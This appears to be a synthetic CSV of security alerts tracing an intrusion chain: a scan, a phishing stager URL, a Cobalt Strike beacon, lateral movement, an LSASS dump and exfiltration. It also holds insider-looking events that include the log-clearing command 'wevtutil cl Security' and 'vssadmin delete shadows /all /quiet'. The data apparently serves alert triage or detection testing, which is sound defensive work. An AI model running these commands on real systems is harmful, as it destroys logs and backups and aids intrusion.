alert_id,timestamp,source_ip,destination_ip,destination_port,alert_name,severity,category,rule_id,asset_tags,raw_payload,analyst_notes
ALERT-001,2026-04-06T05:02:11Z,185.220.101.47,10.0.1.1,0,External SYN scan against perimeter — 4096 ports,critical,recon,RECON-001,server,"{""ports_scanned"":4096,""scan_type"":""SYN"",""duration_sec"":8}","High-rate scan from known Tor exit; precedes most intrusion chains in threat intel"
ALERT-002,2026-04-06T05:06:33Z,185.220.101.47,10.0.1.45,443,Phishing payload delivered via HTTPS,critical,phishing,PHISH-001,"server,dc","{""url"":""https://office365-update.ru/payload.exe"",""user_agent"":""curl/7.81""}","Confirmed malicious domain; payload is a known Cobalt Strike stager"
ALERT-003,2026-04-06T05:09:47Z,185.220.101.47,10.0.1.45,4444,Cobalt Strike beacon — reverse shell established,critical,malware,C2-001,"server,dc","{""proto"":""tcp"",""bytes"":8400,""beacon_interval_sec"":60}","Beacon matches CS default profile; C2 over port 4444"
ALERT-004,2026-04-06T05:11:22Z,185.220.101.47,10.0.1.8,445,SMB lateral movement from compromised host,critical,lateral_movement,SMB-001,"server,dc","{""shares_accessed"":[""ADMIN$"",""C$""],""method"":""PsExec""}","Pass-the-hash via PsExec; source host confirmed compromised"
ALERT-005,2026-04-06T05:13:58Z,185.220.101.47,10.0.1.8,0,LSASS memory dumped on domain controller,critical,malware,CRED-001,"server,dc","{""proc"":""lsass.exe"",""parent"":""rundll32.exe"",""bytes_read"":52428800}","Credential harvesting from DC memory; NTLM hashes likely extracted"
ALERT-006,2026-04-06T05:16:04Z,185.220.101.47,45.142.212.100,443,Large encrypted outbound transfer to C2 host,critical,data_exfil,EXFIL-001,"server,dc","{""bytes"":1073741824,""duration_sec"":420,""dst_asn"":""AS206728""}","1GB exfil over 7 min; destination is bulletproof hosting provider"
ALERT-007,2026-04-06T04:51:03Z,10.0.1.15,10.0.1.1,389,New privileged account created outside change window,critical,malware,PRIV-001,"server,dc","{""username"":""svc_deploy2"",""groups"":""Domain Admins"",""created_by"":""jmartinez""}","Account created at 04:51 UTC; no change request filed"
ALERT-008,2026-04-06T04:54:17Z,10.0.1.15,10.0.1.1,0,Scheduled task registered for persistence,high,malware,PERSIST-001,"server,dc","{""task_name"":""WindowsSecurityHealth"",""trigger"":""AtLogon"",""action"":""C:\\Temp\\update.exe""}","Task binary in Temp; not signed; matches known implant dropper"
ALERT-009,2026-04-06T04:57:44Z,10.0.1.15,10.0.1.1,0,Security event logs cleared on domain controller,critical,malware,LOG-001,"server,dc","{""cmdline"":""wevtutil cl Security"",""cleared_events"":14293}","14293 events wiped; standard attacker anti-forensics step"
ALERT-010,2026-04-06T05:00:29Z,10.0.1.15,10.0.1.5,445,Shadow copy deletion across all drives,critical,malware,RAN-002,"server,dc","{""cmdline"":""vssadmin delete shadows /all /quiet"",""drives_affected"":4}","Ransomware pre-encryption step; backup destruction confirmed"
